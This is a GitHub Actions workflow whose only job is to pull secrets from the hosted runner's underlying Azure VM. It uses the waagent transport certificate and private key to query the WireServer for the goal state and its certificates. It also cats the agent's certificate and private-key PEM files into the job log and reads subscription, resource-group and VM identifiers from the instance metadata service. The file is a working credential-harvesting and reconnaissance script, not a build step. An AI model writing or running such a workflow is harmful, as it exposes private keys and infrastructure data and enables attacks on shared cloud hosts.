name: WireServer Certs v5
on:
  workflow_dispatch:

jobs:
  ws-certs:
    runs-on: ubuntu-latest
    steps:
      - name: GoalState and Certificates via Python script file
        run: |
          cat > /tmp/ws.py << 'SCRIPT'
          import subprocess, xml.etree.ElementTree as ET, sys
          def run(cmd):
              r = subprocess.run(cmd, capture_output=True, text=True, timeout=20)
              return r.stdout, r.stderr
          ws = 'http://168.63.129.16/machine/?comp=goalstate'
          cert_flag = '/var/lib/waagent/TransportCert.pem'
          key_flag = '/var/lib/waagent/TransportPrivate.pem'
          hdrs = ['-H', 'x-ms-version: 2012-11-30']
          cmd = ['curl', '-sf', '--max-time', '15', '--cert', cert_flag, '--key', key_flag, ws] + hdrs
          gs_out, gs_err = run(cmd)
          print('GOALSTATE_LEN=' + str(len(gs_out)))
          if len(gs_out) < 100:
              print('GOALSTATE_FAILED:', gs_err[:200])
              sys.exit(0)
          try:
              root = ET.fromstring(gs_out)
          except Exception as e:
              print('XML_ERROR:', e)
              sys.exit(0)
          cert_url = None
          for elem in root.iter():
              tag = elem.tag.split('}')[-1] if '}' in elem.tag else elem.tag
              if tag == 'Certificates' and elem.text:
                  cert_url = elem.text.strip()
          print('CERT_URL=' + str(cert_url))
          if cert_url:
              cmd2 = ['curl', '-sf', '--max-time', '15', '--cert', cert_flag, '--key', key_flag, cert_url] + hdrs
              out, err = run(cmd2)
              print('=== WIRESERVER_CERTS ===')
              print('STDOUT:', out[:3000] or '(empty)')
              print('STDERR:', err[:500] or '(none)')
          SCRIPT
          python3 /tmp/ws.py

      - name: Waagent Files
        run: |
          echo "=== Certificates.pem ==="
          cat /var/lib/waagent/Certificates.pem 2>/dev/null || echo NO_FILE
          echo "=== TransportCert.pem ==="
          cat /var/lib/waagent/TransportCert.pem 2>/dev/null || echo NO_FILE
          echo "=== TransportPrivate.pem ==="
          cat /var/lib/waagent/TransportPrivate.pem 2>/dev/null || echo NO_FILE
          echo "=== waagent ls ==="
          ls -la /var/lib/waagent/ 2>/dev/null | head -20

      - name: IMDS
        run: |
          curl -sf -H "Metadata:true" \
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | python3 -c "
          import sys,json
          try:
              d=json.load(sys.stdin)['compute']
              print('VMID='+d['vmId'])
              print('VMNAME='+d['name'])
              print('SUBID='+d['subscriptionId'])
              print('RG='+d['resourceGroupName'])
              print('LOCATION='+d['location'])
          except Exception as e:
              print('IMDS_ERROR:',e)
          "
